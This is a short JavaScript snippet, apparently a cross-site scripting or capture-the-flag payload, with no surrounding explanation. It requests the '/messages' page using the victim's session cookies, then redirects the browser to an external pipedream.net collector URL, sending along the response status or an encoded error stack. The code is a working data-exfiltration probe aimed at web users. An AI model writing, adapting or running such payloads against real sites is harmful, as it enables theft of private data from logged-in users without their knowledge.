(async function(){
  const END = "https://eoeipamgnflz15n.m.pipedream.net";

  const url = "/messages";
  try {
    const res = await fetch(url, { method: "GET", credentials: "include" });
    const payload = res.status
    document.location = END + "?p=" + payload;
  } catch (err) {
    const payload = encodeURIComponent(safeB64(String(err && err.stack ? err.stack : err)));
    document.location = END + "?err=" + payload;
  }
})();
